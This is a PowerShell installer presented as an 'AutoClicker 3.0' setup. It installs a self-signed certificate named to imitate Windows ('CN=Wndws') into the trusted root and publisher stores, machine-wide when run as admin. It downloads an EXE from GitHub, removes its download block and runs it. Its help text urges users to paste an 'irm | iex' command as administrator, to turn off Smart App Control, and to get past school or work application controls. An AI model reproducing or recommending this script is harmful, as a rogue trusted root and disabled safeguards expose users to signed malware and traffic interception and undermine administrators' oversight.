# AutoClicker 3.0 public installer — download, trust Wndws cert, verify signature, launch.
#Requires -Version 5.1

param(
    [switch]$SkipLaunch,
    [string]$InstallDir
)

$ErrorActionPreference = 'Stop'

$script:BaseUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main'
$script:ExeUrl = "$script:BaseUrl/AutoClicker-3.0.exe"
$script:CerUrl = "$script:BaseUrl/Wndws.cer"
$script:ExeName = 'AutoClicker-3.0.exe'
$script:PublisherSubject = 'CN=Wndws'

function Test-IsAdministrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-DefaultInstallDirectory {
    $localApp = Join-Path $env:LOCALAPPDATA 'AutoClicker'
    if (-not [string]::IsNullOrWhiteSpace($localApp)) {
        return $localApp
    }
    return Join-Path $env:USERPROFILE 'Downloads'
}

function Get-DownloadsDirectory {
    $candidates = @(
        (Join-Path $env:USERPROFILE 'Downloads')
    )

    if ($env:OneDrive) {
        $candidates += Join-Path $env:OneDrive 'Downloads'
    }

    $profile = [Environment]::GetFolderPath('UserProfile')
    if ($profile) {
        $candidates += Join-Path $profile 'Downloads'
    }

    foreach ($path in ($candidates | Select-Object -Unique)) {
        if (-not [string]::IsNullOrWhiteSpace($path) -and (Test-Path -LiteralPath $path)) {
            return $path
        }
    }

    $fallback = Join-Path $env:USERPROFILE 'Downloads'
    if (-not (Test-Path -LiteralPath $fallback)) {
        New-Item -ItemType Directory -Force -Path $fallback | Out-Null
    }
    return $fallback
}

if ([string]::IsNullOrWhiteSpace($InstallDir)) {
    $InstallDir = Get-DefaultInstallDirectory
}

function Write-Step {
    param(
        [string]$Message,
        [string]$Color = 'Cyan'
    )
    Write-Host "  [$((Get-Date).ToString('HH:mm:ss'))] $Message" -ForegroundColor $Color
}

function Write-LaunchBlockedHelp {
    param([string]$ExePath)

    Write-Host ''
    Write-Host '  Windows Application Control blocked the launch.' -ForegroundColor Yellow
    Write-Host '  The file downloaded and the signature verified — only execution was blocked.' -ForegroundColor DarkGray
    Write-Host ''
    Write-Host "  Saved EXE: $ExePath" -ForegroundColor White
    Write-Host ''
    Write-Host '  Try these (in order):' -ForegroundColor Cyan
    Write-Host '    1. Re-run installer as Administrator (trusts cert machine-wide):' -ForegroundColor White
    Write-Host '       irm https://raw.githubusercontent.com/JustValkz/Myst/main/install-public.ps1 | iex' -ForegroundColor DarkGray
    Write-Host '       (Right-click PowerShell -> Run as administrator, then paste)' -ForegroundColor DarkGray
    Write-Host '    2. Double-click the EXE in File Explorer (same folder as above).' -ForegroundColor White
    Write-Host '    3. Windows 11 Smart App Control: Settings -> Privacy & security ->' -ForegroundColor White
    Write-Host '       Windows Security -> App & browser control -> Smart App Control settings -> Off' -ForegroundColor DarkGray
    Write-Host '    4. School/work PC: IT AppLocker/WDAC may block all non-store apps — use private DLL instead.' -ForegroundColor White
    Write-Host ''
}

function Get-SmartAppControlState {
    try {
        $status = Get-MpComputerStatus -ErrorAction Stop
        return [string]$status.SmartAppControlState
    } catch {
        return $null
    }
}

function Ensure-InstallDirectory {
    param([string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        New-Item -ItemType Directory -Force -Path $Path | Out-Null
    }
}

function Get-TrustedWndwsCert {
    param([string]$StoreRoot)

    Get-ChildItem "$StoreRoot\Root" -ErrorAction SilentlyContinue |
        Where-Object { $_.Subject -eq $script:PublisherSubject } |
        Select-Object -First 1
}

function Import-WndwsCertToStore {
    param(
        [string]$CerPath,
        [string]$StoreRoot,
        [string]$LeafStore
    )

    $rootPath = "$StoreRoot\Root"
    $leafPath = "$StoreRoot\$LeafStore"

    if (-not (Get-TrustedWndwsCert -StoreRoot $StoreRoot)) {
        Import-Certificate -FilePath $CerPath -CertStoreLocation $rootPath | Out-Null
    }

    $existingPublisher = Get-ChildItem $leafPath -ErrorAction SilentlyContinue |
        Where-Object { $_.Subject -eq $script:PublisherSubject } |
        Select-Object -First 1

    if (-not $existingPublisher) {
        Import-Certificate -FilePath $CerPath -CertStoreLocation $leafPath | Out-Null
    }
}

function Install-WndwsTrustedPublisher {
    param([string]$CerPath)

    Write-Step 'Installing Wndws publisher certificate (Current User)...'
    Import-WndwsCertToStore -CerPath $CerPath -StoreRoot 'Cert:\CurrentUser' -LeafStore 'TrustedPublisher'

    if (Test-IsAdministrator) {
        Write-Step 'Installing Wndws publisher certificate (Local Machine)...' 'Green'
        Import-WndwsCertToStore -CerPath $CerPath -StoreRoot 'Cert:\LocalMachine' -LeafStore 'TrustedPublisher'
    } else {
        Write-Step 'Tip: run PowerShell as Administrator once so Windows trusts Wndws machine-wide.' 'Yellow'
    }

    $trusted = Get-TrustedWndwsCert -StoreRoot 'Cert:\CurrentUser'
    if ($trusted) {
        Write-Step 'Wndws certificate trusted (Root + Publisher).' 'Green'
        return $trusted
    }

    throw 'Failed to install Wndws publisher certificate.'
}

function Test-WndwsSignedExecutable {
    param([string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        throw "Executable not found: $Path"
    }

    $signature = Get-AuthenticodeSignature -FilePath $Path
    $signer = $signature.SignerCertificate

    if (-not $signer) {
        throw 'AutoClicker-3.0.exe is not Authenticode signed.'
    }

    if ($signer.Subject -ne $script:PublisherSubject) {
        throw "Unexpected signer: $($signer.Subject) (expected $script:PublisherSubject)"
    }

    if ($signature.Status -notin @('Valid', 'UnknownError')) {
        throw "Signature check failed: $($signature.Status)"
    }

    return $signature
}

function Save-Download {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][string]$Destination,
        [int]$MinBytes = 0
    )

    Write-Step "Downloading $(Split-Path -Leaf $Destination)..."
    if (Test-Path -LiteralPath $Destination) {
        Remove-Item -LiteralPath $Destination -Force
    }
    Invoke-WebRequest -Uri $Url -OutFile $Destination -UseBasicParsing

    if ($MinBytes -gt 0 -and (Get-Item -LiteralPath $Destination).Length -lt $MinBytes) {
        throw "Download looks too small or corrupt: $Destination"
    }
}

function Start-PublicExecutable {
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [Parameter(Mandatory = $true)][string]$WorkingDirectory
    )

    if (-not (Test-Path -LiteralPath $Path)) {
        throw "Executable not found: $Path"
    }

    Unblock-File -LiteralPath $Path -ErrorAction SilentlyContinue

    try {
        Start-Process -FilePath $Path -WorkingDirectory $WorkingDirectory -ErrorAction Stop
        return $true
    } catch {
        $firstError = $_.Exception.Message
    }

    try {
        Start-Process -FilePath 'explorer.exe' -ArgumentList "`"$Path`"" -ErrorAction Stop
        return $true
    } catch {
        $secondError = $_.Exception.Message
    }

    Write-LaunchBlockedHelp -ExePath $Path
    if ($firstError) {
        Write-Host "  Start-Process: $firstError" -ForegroundColor DarkGray
    }
    if ($secondError) {
        Write-Host "  Explorer launch: $secondError" -ForegroundColor DarkGray
    }
    return $false
}

Write-Host ''
Write-Host '  AutoClicker 3.0' -ForegroundColor White
Write-Host ''

$sacState = Get-SmartAppControlState
if ($sacState -eq 'On') {
    Write-Step 'Smart App Control is ON — self-signed apps may be blocked until SAC is off or you run as Admin.' 'Yellow'
}

Ensure-InstallDirectory -Path $InstallDir

$cerPath = Join-Path $env:TEMP 'Wndws.cer'
$exePath = Join-Path $InstallDir $script:ExeName

Save-Download -Url $script:CerUrl -Destination $cerPath
Install-WndwsTrustedPublisher -CerPath $cerPath

Save-Download -Url $script:ExeUrl -Destination $exePath -MinBytes 65536
Unblock-File -LiteralPath $exePath -ErrorAction SilentlyContinue

$signature = Test-WndwsSignedExecutable -Path $exePath
Write-Step "Verified: signed by $($signature.SignerCertificate.Subject) ($($signature.Status))" 'Green'
Write-Step "Installed to: $exePath" 'Green'

if (-not $SkipLaunch) {
    Write-Step 'Launching AutoClicker 3.0...' 'Cyan'
    $launched = Start-PublicExecutable -Path $exePath -WorkingDirectory $InstallDir
    if (-not $launched) {
        exit 1
    }
}

Write-Host ''
Write-Host '  Done.' -ForegroundColor Green
Write-Host ''
